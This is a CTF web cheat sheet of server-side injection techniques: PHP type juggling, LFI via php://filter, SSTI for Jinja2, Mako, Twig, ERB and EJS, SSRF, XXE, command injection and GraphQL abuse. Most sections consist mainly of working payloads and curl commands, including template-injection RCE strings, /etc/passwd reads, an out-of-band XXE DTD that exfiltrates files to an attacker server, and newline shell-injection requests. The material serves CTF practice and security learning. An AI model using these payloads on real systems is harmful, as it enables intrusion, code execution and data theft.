# CTF Web - Server-Side Injection Attacks

## Table of Contents
- [PHP Type Juggling](#php-type-juggling)
- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
- [SQL Injection](#sql-injection) — moved to [sql-injection.md](sql-injection.md)
- [Python str.format() Attribute Traversal (PlaidCTF 2017)](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
  - [String Interpolation Injection](#string-interpolation-injection)

For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS), see [server-side-exec.md](server-side-exec.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

---

## PHP Type Juggling

**Pattern:** PHP loose comparison (`==`) performs implicit type conversion, leading to unexpected equality results that bypass authentication and validation checks.

**Comparison table (all `true` with `==`):**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | Non-numeric string converts to `0` |
| `0 == ""` | `true` | Empty string converts to `0` |
| `"0" == false` | `true` | `"0"` is falsy |
| `NULL == false` | `true` | Both falsy |
| `NULL == ""` | `true` | Both falsy |
| `NULL == array()` | `true` | Both empty |
| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |

**Auth bypass with type juggling:**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**Exploit via JSON type confusion:**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**Array bypass for strcmp:**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

**Prevention:** Use strict comparison (`===`) which checks both value and type.

**Key insight:** Always test `0`, `""`, `NULL`, `[]`, and `"0e..."` magic hash values against PHP comparison endpoints. JSON `Content-Type` allows sending integer `0` where the application expects a string.

---

## PHP File Inclusion / php://filter

**Pattern:** PHP `include`, `require`, `require_once` accept dynamic paths. Combined with `php://filter`, leak source code without execution.

**Basic LFI:**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**Source code disclosure via php://filter:**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**Filter chains for RCE (PHP >= 7):**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**Common LFI targets:**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

**Key insight:** `php://filter/convert.base64-encode/resource=` is the most reliable way to read PHP source code through an LFI — base64 encoding prevents the included file from being executed as PHP.

---

## SQL Injection

SQL injection techniques have been moved to a dedicated file. See [sql-injection.md](sql-injection.md) for all SQL injection techniques.

---

## Python str.format() Attribute Traversal (PlaidCTF 2017)

**Pattern:** Python's `str.format()` method allows attribute/index traversal on format arguments. When user input reaches `.format(obj)`, attackers can access arbitrary attributes of the passed objects.

```python
# Leak object attributes via format string
payload = "{0.__class__.__mro__}"
payload = "{0.secret_field}"

# In Flask: endpoint uses new_name.format(player_object)
# Send: {0.pykemon} to leak all pykemon objects

# Access nested attributes
"{0.__class__.__init__.__globals__}"

# Dictionary key access via bracket notation
"{0[secret_key]}"

# Chaining attribute and index access
"{0.__class__.__mro__[1].__subclasses__()}"
```

**Common vulnerable patterns:**
```python
# Vulnerable: user input as format string
greeting = user_input.format(current_user)

# Vulnerable: format with request object
message = template_str.format(request)

# Safe alternative: use positional or keyword args only
greeting = "Hello, {name}!".format(name=user_input)
```

**Key insight:** Unlike `%s` formatting, Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`), turning any format call with user input into an info leak. This is distinct from SSTI — it does not require a template engine, just a `.format()` call where the format string is user-controlled. Look for Flask/Django views that use `.format()` with user input on model objects or request objects.

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**Pattern (Checking It Twice):** User input passed to `ejs.render()` in error paths.
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**Pattern (Treasure Hunt 5):** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.

**Detection:** Ruby/Sinatra app, `require 'erb'` in source. Cookie or parameter reflected in rendered response.

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**Key insight:** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

---

## SSRF

### Host Header SSRF (MireaCTF)

Server-side code uses the HTTP `Host` header to construct internal validation requests:
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**Exploitation:**
1. Set up an attacker-controlled server returning the desired response:
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**Key insight:** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.

**Detection:** Server code that builds URLs from `request.Host`, `request.headers['Host']`, `c.Request.Host` (Go/Gin), or `$_SERVER['HTTP_HOST']` (PHP) for internal service calls.

---

### DNS Rebinding for TOCTOU
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
Host evil.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

### XXE via DOCX/Office XML Upload (School CTF 2016)

DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.

```bash
# Step 1: Create a minimal DOCX and extract it
mkdir docx_exploit && cd docx_exploit
unzip template.docx

# Step 2: Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF

# Step 3: Repackage as DOCX
zip -r exploit.docx '[Content_Types].xml' word/ _rels/

# Step 4: Upload to target
curl -F "file=@exploit.docx" http://target/upload
# Response or error message may contain base64-encoded file contents
```

**Key insight:** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.

---

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)

Application builds XML from HTTP headers (e.g., `X-Forwarded-For`) without sanitization. First-tag-wins XML parsing allows injecting arbitrary elements:

```http
X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
```

Produces: `<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` -- the XML parser takes the first `<admin>true</admin>`, ignoring the legitimate `<admin>false</admin>` that follows.

**Key insight:** XML injection via HTTP headers when server builds XML from header values without escaping. First-match semantics exploit duplicate tags. Check any header that appears in server responses or logs as structured data (`X-Forwarded-For`, `User-Agent`, `Referer`).

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
Common missed: `;` semicolons, backticks, `$()` substitution

### Sendmail Parameter Injection via CGI (SECCON 2015)

When CGI scripts pass user input to `sendmail` via `open()` pipe:

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

Inject shell commands by breaking out of the quoted context:

```bash
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.

### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)

When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:

1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
   ```text
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.

### Git CLI Newline Injection via URL Path (BSidesSF 2026)

**Pattern (gitfab):** A web-based repository viewer shells out to git CLI using backticks: `` `git show "#{path}"` ``. The application sanitizes shell metacharacters (`<`, `>`, `|`, `;`, `&`) but allows newlines. URL-encoded newline (`%0a`) in the path parameter breaks out of the git command and injects arbitrary shell commands.

```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

Decoded, this becomes:
```bash
git show "test"
cat /home/ctf/flag.txt
echo ""
```

```ruby
require 'httparty'

# URL-encode newline injection
path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
puts response.body
```

**Key insight:** Newline (`\n`, `%0a`) is frequently overlooked in command injection filters. While `;`, `|`, and `&` are commonly blocked, newline acts as a command separator in shell and is valid in URLs. Any application that passes URL path components to shell commands via string interpolation (backticks, `system()`, `popen()`) is vulnerable if newlines aren't filtered.

**When to recognize:** Web app interacts with git, svn, or other CLI tools. Source shows shell interpolation with partial sanitization. Test with `%0a` (newline) and `%0d%0a` (CRLF) in URL parameters.

**Defense check:** Does the filter block `\n` (0x0a)? Does it use allowlists instead of blocklists? Does it use `execve()` (no shell) instead of `system()` (shell)?

---

## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)

### Introspection and Schema Discovery

```graphql
# Full schema enumeration (often left enabled in CTFs)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Shortened introspection query
{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}

# Find all mutations
{__schema{mutationType{fields{name,args{name,type{name}}}}}}

# Find hidden types
{__schema{types{name,kind,description}}}
```

### Query Batching and Aliasing for Rate Limit Bypass

```graphql
# Execute same mutation N times in single request via aliases
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
  # ... repeat 1337 times
}

# Or via array batching (if supported):
# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
```

### String Interpolation Injection

```javascript
// Vulnerable server code pattern:
const query = `mutation { doAction(input: "${userInput}") { result } }`;

// Injection payload:
// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
// Resulting query:
// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
```

**Key insight:** GraphQL combines query language power with REST-like endpoints. Three main attack surfaces: (1) introspection reveals the full API schema, (2) query batching/aliasing bypasses rate limits and multiplies actions, (3) string interpolation in server-side query construction enables injection similar to SQLi.

---

*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog/Common Lisp injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, and more).*
